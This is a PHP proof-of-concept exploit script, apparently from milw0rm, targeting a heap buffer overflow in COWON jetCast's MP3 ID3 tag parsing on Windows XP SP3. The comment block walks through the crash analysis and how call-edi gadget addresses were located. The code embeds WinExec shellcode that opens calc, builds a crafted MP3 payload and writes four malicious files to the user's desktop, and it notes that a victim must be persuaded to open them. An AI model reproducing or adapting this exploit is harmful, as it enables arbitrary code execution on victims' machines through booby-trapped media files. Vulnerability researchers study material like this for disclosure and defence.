<?php
        /*
        COWON America jetCast 2.0.4.1109 (.mp3) local heap buffer overlow exploit (xp/sp3)
        by Nine:Situations:Group::pyrokinesis
         
        site: http://retrogod.altervista.org/
        software site: http://www.jetaudio.com/
        Tested against JetAudio pack v.7.5.2
        ---------------------------------------------------------------------------------
        Passing an overlong string as id3 tag we have:
         
        (370.7a8): Access violation - code c0000005 (first chance)
        First chance exceptions are reported before any exception handling.
        This exception may be expected and handled.
        eax=41414141 ebx=00000394 ecx=41414141 edx=00160608 esi=010c1a00 edi=0302fbc8
        eip=00486db7 esp=0302fb14 ebp=0302fe7c iopl=0         nv up ei pl nz ac po nc
        cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212
        jetCast+0x86db7:
        00486db7 8b11            mov     edx,dword ptr [ecx]  ds:0023:41414141=????????
         
        code:
        00486DB7  |. 8B11           MOV EDX,DWORD PTR DS:[ECX] <-------crash
        00486DB9  |. 8B8D ACFCFFFF  MOV ECX,DWORD PTR SS:[EBP-354]
        00486DBF  |. FF52 0C        CALL DWORD PTR DS:[EDX+C]
        ...
        -------------------------------------------------------------------------------------
        We have 4 bytes of ecx to redirect the program to edi, which keeps our buffer.
        To do that first we set ecx to a portion of memory which *always* (or nearly) keeps
        the filename.
        Look 0x01050000... no null char allowed, so I will use 0x01050101 to hit the right
        offset.
         
        To build it we need an address which points to a known call edi, compatible with
        windows filenames. To achieve that you may do so:
        x@pyro ~/framework-2.2/tools
        $ memdump (pid) jetcast
        x@pyro ~/framework-2.2/tools
        $ cd ..
        x@pyro ~/framework-2.2/
        $ msfpescan -d ./tools/jetcast/ -j edi
        0x7d03388b call edi
        ...
        x@pyro ~/framework-2.2/tools
        $ msfpescan -d ./tools/jetcast/ -x "\x8b\x38\x03\x7d"
        0x028997c4   8b38037d
        0x77e062f5   8b38037d
        ...
        then subtract c. Repeat this for each call edi, took me some time to find every
        combination by a script and I finally found a good one in the MSVCRT.DLL given
        with the program; a third match seems not possible.
        Note: first bytes of EDI keep some null chars, but as you can see, this
        portion is nop-equivalent:
        0348FBC8   0000             ADD BYTE PTR DS:[EAX],AL
        0348FBCA   0000             ADD BYTE PTR DS:[EAX],AL
        0348FBCC   0000             ADD BYTE PTR DS:[EAX],AL
        0348FBCE   0000             ADD BYTE PTR DS:[EAX],AL
        0348FBD0   90               NOP
        0348FBD1   90               NOP
        0348FBD2   90               NOP
        ...
         
        Usage: php 9sg_jetcast_poc.php
        It creates 4 files on your desktop, it says which will hit the right offset on
        your system (file path is important to achieve arbitrary code execution on a victim user
        so an attacker should persuade him to try to stream them ...)
        It works by dragging the file on it or by right clicking and selecting "Add files ...",
        not 100% reliable, version specific...
        -------------------------------------------------------------------------------------
        */
         
        error_reporting(0);
        if (php_sapi_name() <> "cli")
        {
                die("[!] Launch from the cli!");
        }
         
        $____scode = "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x59\x53". "\xbb\x0d\x25\x86\x7c". //WinExec, 0x7c86250d
        "\xff\xd3\x31\xc0\x50". "\xbb\x12\xcb\x81\x7c". //ExitProcess, 0x7c81cb12
        "\xff\xd3\xe8\xe0\xff\xff\xff\x63\x6d\x64\x2e\x65". "\x78\x65\x20\x2f\x63\x20". "cmd /c calc && ". "\xff";
         
        if (strlen($____scode) > 118)
        {
                die("[!] Shellcode too large here!");
        }
        $____BOOM = "\x49\x44\x33\x03\x00\x00\x00\x00\x07\x7b\x54\x49\x54\x32\x00\x00\x03\xbe\x00\x00\x00". str_repeat("\x90", 0x7c).//nop, very reusable
        "\xeb\x06\x90\x90". //jmp short
         
        //"\x01\x01\x06\x01". //less usually in this location...
        "\x01\x01\x05\x01". //eax - ecx, this works 80% of the times
        "\x90\x90\x90\x90". //nop
        $____scode. str_repeat("A", 0x01f0 - strlen($____scode)). "\x54\x41\x4c\x42\x00\x00\x00\x02\x00\x00\x00\x31\x54\x59\x45\x52\x00\x00\x00\x05\x00\x00\x00\x31\x39\x35\x30\x54\x43\x4f". "\x4e\x00\x00\x00\x02\x00\x00\x00\x31\x54\x43\x4f\x50\x00\x00\x00\x02\x00\x00\x00\x31\xff\xfb\x90\x64\x00\x00\x00\x00\x00\x00\x00". "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x49\x6e\x66\x6f\x00\x00\x00". "\x0f\x00\x00\x04\x7e\x00\x07\x57\x2e\x00\x02\x05\x08\x0a\x0d\x10\x12\x14\x17\x19\x1c\x1f\x21\x24\x27\x28\x2b\x2e\x30\x33\x36\x38". "\x3b\x3d\x40\x42\x45\x48\x4a\x4d\x4f\x51\x54\x57\x59\x5c\x5f\x61\x63\x66\x69\x6b\x6e\x71\x73\x76\x78\x7a\x7d\x80\x82\x85\x88\x8a". "\x8c\x8f\x92\x94\x97\x9a\x9c\x9e\xa1\xa3\xa6\xa9\xab\xae\xb1\xb2\xb5\xb8\xba\xbd\xc0\xc3\xc4\xc7\xca\xcc\xcf\xd2\xd4\xd7\xd9\xdb". "\xde\xe1\xe3\xe6\xe9\xeb\xed\xf0\xf3\xf5\xf8\xfb\xfd\x00\x00\x00\x37\x4c\x41\x4d\x45\x33\x2e\x39\x38\x20\x01\xaa\x00\x00\x00\x00". "\x00\x00\x00\x00\x14\x80\x24\x04\xc7\x4e\x00\x00\x80\x00\x07\x57\x2e\x4f\x7b\xf5\x99\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00". "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00". "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00". "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00". "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00". "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00". "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00". "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfb\x90\x64\x00\x09\xf3\x50\x68\xbc". "\xb0\x42\x83\x72\x00\x00\x0d\x20\x00\x00\x01\x14\x35\xa8\xf0\x04\x3e\x8d\xc8\x00\x00\x34\x80\x00\x00\x04\x00\x20\xc0\x01\xf2\x67". "\x21\x27\x0e\x60\x05\x16\x77\x3c\x84\x69\xc8\xdf\xff\xff\xf3\x9d\xe4\x21\x18\xe0\x00\x04\x65\xa6\x9a\x74\xcb\xe5\xf2\x7d\x22\x18". "\x18\xd0\x58\x43\x15\x8a\x50\xd4\x73\xc9\xf2\xfb\xa0\x82\x09\xbd\x48\x20\x85\x68\x20\x85\x34\xd3\xa9\x37\x41\x66\xea\x41\xbf\xab". "\x41\x04\x2b\x4d\x37\xa6\x9b\xd0\x41\x0d\x06\xff\xff\xff\xad\x34\xd2\x20\x06\xa4\xd9\xbb\xad\x34\xd3\xd0\x41\xaa\x41\xb5\xff\xd3". "\x48\xdd\x46\x0f\xf6\x8b\xd4\x95\x75\x15\x24\x60\x4c\x3f\xc8\x95\x53\x6c\x09\x23\x5b\x55\xae\xbd\x73\xaf\xbc\x7c\xfd\xeb\x3f\x5f". "\x74\x92\x29\x7f\x2e\x71\xa2\x67\x78\xc7\xdd\xbd\xeb\x5a\xef\x35\x7a\x8b\x4b\xc4\xd1\x74\xd5\x44\x08\x59\xc2\x52\x10\x18\x03\x65". "\x80\xe2\x81\x85\x43\xb2\x5d\x26\x88\xb1\x16\x27\x92\x5a\x46\xc6\x49\x3d\x13\x13\x54\x98\xc4\xc4\xd5\x92\x32\x76\x3e\x4d\x0b\x34". "\x6b\x1b\xa6\x79\x16\x5d\x9d\x2a\xd1\x4a\x89\x89\xab\x24\x64\x93\x4c\x8c\x9d\xcf\x14\x46\x5c\x64\x0e\xb9\xe5\xba\xb7\xd7\xba\xaa". "\xba\x96\xb6\xa4\x75\x48\x13\xc1\xf1\x05\x04\x97\x12\x27\x8c\x51\x64\x8b\xc9\x3d\x13\x24\x9d\x91\x47\x75\xd4\xee\xc8\xb9\x18\x62". "\x28\xe5\xa2\xeb\xca\xb2\x7b\x9b\xcb\x17\x77\x57\x84\x20\x04\x09\x49\x4a\x87\xb2\x30\x2b\x22\x52\x9f\x1a\xa7\xfa\xce\xfd\xef\x47". "\x94\xa3\xc8\x90\x1e\x66\x25\x91\xa3\xd4\xe2\xc7\x1f\x3b\x7f\x1e\xf7\xbc\x37\xef\xe3\xd3\x3e\x9a\x65\xf3\x76\x93\x65\xf2\xf8\xe5". "\x86\x47\x04\xf2\x81\xb6\x00\x16\x6c\x65\x4a\xef\x74\x10\x41\x37\x6a\x08\x20\x60\x68\x99\x9a\x69\x9b\xbd\x35\x1c\x27\x0c\x48\x99". "\x38\x4e\x13\x64\xfb\xa1\x98\x17\x10\x41\x74\xd3\x4d\x34\x19\x6b\x2f\x9a\x54\x82\x88\xa1\x38\xff\xfb\x92\x64\x38\x8d\xf5\x62\x6a". "\xbb\x81\x0f\xa3\x72\x00\x00\x0d\x20\x00\x00\x01\x0e\x71\x6a\xf2\x21\x8e\x0d\xc8\x00\x00\x34\x80\x00\x00\x04\x66\x1d\x51\x49\x92". "\x44\x50\xd0\xc0\xd1\x03\x03\x43\x74\xd3\xad\xf5\x3a\xb4\x18\xc0\xb8\x79\x33\x33\x83\x5c\x2c\x18\x2c\x64\xb8\xb2\xf9\x99\x7d\x34". "\xd4\x87\x41\x69\xd4\x60\x68\xd4\xd6\x66\x6f\x98\x11\x03\xa2\xe5\x36\x4c\xa0\x79\x34\xe5\xdd\xaa\xfb\x36\xca\x14\x04\x04\x04\x98";
        $____x = 0x35;
        $____v = (strlen($_SERVER["USERPROFILE"]) % 4);
        $____x = $____x - $____v;
        //addresses that worked for me...
        //$____pad = str_repeat("\x73\xb2\x42\x77",$____x); //0x7742b27f COMCTL32.DLL->0x10003dcc call edi, JetCFG.dll
        //$____pad = str_repeat("\xe9\x62\xe0\x77",$____x); //0x77e062f5 RPCRT4.DLL->0x7d03388b call edi, SHELL32.DLL
        //$____pad = str_repeat("\x23\xa2\xae\x76",$____x); //0x76aea22f ATL.DLL->0x10003dcc call edi, JetCFG.dll
        $____pad = str_repeat("\xf3\xa5\xc0\x77", $____x); //0x77c0a5ff MSVCRT.DLL->0x10003dcc call edi, JetCFG.dll, best one
        for ($i = 0; $i < 4; $i++)
        {
                $____junk = str_repeat("_", $i);
                $____fname = "_9sg__mzk_".$____junk.$____pad.".MP3";
                $____path = $_SERVER["USERPROFILE"]."\\Desktop\\".$____fname;
                $____x = fopen($____path, "w+");
                if (!$____x)
                {
                        die("[!] Unable to create ".$____path." ...");
                }
                fputs ($____x, $____BOOM);
                fclose($____x);
                print("[*] ".$____path." created!\n");
                if ($i == $____v)
                        {
                        print("[?] This will hit the right offset on your system! Do you like my composition?\n");
                }
        }
?>

# milw0rm.com [2009-05-26]
